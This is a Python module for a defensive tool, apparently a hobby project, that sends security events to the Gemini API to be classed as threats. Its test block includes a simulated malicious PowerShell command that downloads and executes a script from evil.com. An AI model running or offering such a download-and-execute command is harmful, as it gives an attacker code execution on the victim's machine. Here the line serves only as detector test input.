import os
import json
import re
import requests
import logging
from datetime import datetime
from dotenv import load_dotenv

load_dotenv() 

LOG_FILE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scan_history.log")
logging.basicConfig(
    filename=LOG_FILE_PATH,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    encoding='utf-8'
)

GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent"

class AIThreatAnalyzer:
    def __init__(self):
        self.api_key = GEMINI_API_KEY
        self.api_url = GEMINI_API_URL
        if not self.api_key:
            logging.info("GEMINI_API_KEY not configured in environment. AI Cognitive Core standing by.")

    def analyze_event(self, event_data):
        """
        Sends suspicious event data to the Gemini API for deep heuristic analysis.
        Returns a structured dictionary to guide automated response decisions.
        """
        if not self.api_key:
            return {"threat_level": "SAFE", "action": "IGNORE", "analysis": "AI Cognitive Core offline (API Key Missing)"}

        headers = {"Content-Type": "application/json"}
        
        prompt = f"""
        You are J.A.R.V.I.S., an elite cybersecurity AI. Analyze this security event:
        
        Event Type: {event_data.get('event_type', 'Unknown')}
        Timestamp: {event_data.get('timestamp', 'N/A')}
        Source: {event_data.get('source', 'N/A')}
        Details: {json.dumps(event_data.get('details', {}), indent=2)}
        
        Provide your assessment strictly in the following JSON format:
        {{
            "threat_level": "SAFE" | "SUSPICIOUS" | "CRITICAL",
            "action": "IGNORE" | "ALERT" | "SUSPEND",
            "analysis": "Concise explanation of the threat and reasoning."
        }}
        """

        payload = {
            "contents": [{"parts": [{"text": prompt}]}],
            "generationConfig": {
                "responseMimeType": "application/json"
            }
        }

        try:
            response = requests.post(f"{self.api_url}?key={self.api_key}", headers=headers, json=payload, timeout=20)
            response.raise_for_status() 
            
            result = response.json()
            ai_text = result['candidates'][0]['content']['parts'][0]['text'].strip()
            
            # Robust JSON extraction
            match = re.search(r'\{.*\}', ai_text, re.DOTALL)
            if match:
                ai_text = match.group(0)
                
            parsed_response = json.loads(ai_text)
            logging.info(f"[AI_ANALYSIS] Assessment: {parsed_response.get('threat_level')} - {parsed_response.get('action')}")
            return parsed_response
            
        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to communicate with Gemini API: {e}")
            return {"threat_level": "UNKNOWN", "action": "IGNORE", "analysis": f"AI Communication Failed: {e}"}
        except (json.JSONDecodeError, KeyError, IndexError) as e:
            logging.error(f"Failed to parse Gemini response: {e}")
            return {"threat_level": "UNKNOWN", "action": "IGNORE", "analysis": "Failed to parse AI response schema"}
        except Exception as e:
            logging.error(f"Unexpected error in AI Analyzer: {e}")
            return {"threat_level": "UNKNOWN", "action": "IGNORE", "analysis": f"AI Internal Error: {e}"}

# Singleton instance
analyzer = AIThreatAnalyzer()

def send_to_gemini_for_analysis(event_data):
    return analyzer.analyze_event(event_data)

if __name__ == "__main__":
    suspicious_event = {
        "event_type": "PROCESS_SPAWN",
        "timestamp": datetime.now().isoformat(),
        "source": "BehavioralMonitor.py",
        "details": {
            "description": "powershell -exec bypass invoked from temp directory",
            "pid": 4021,
            "cmdline": "powershell.exe -exec bypass -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
        }
    }
    print("[*] J.A.R.V.I.S: Routing simulated threat to Cognitive Core...")
    res = send_to_gemini_for_analysis(suspicious_event)
    print(f"\n[AI_ASSESSMENT]\nThreat Level: {res['threat_level']}\nAction: {res['action']}\nAnalysis: {res['analysis']}\n")
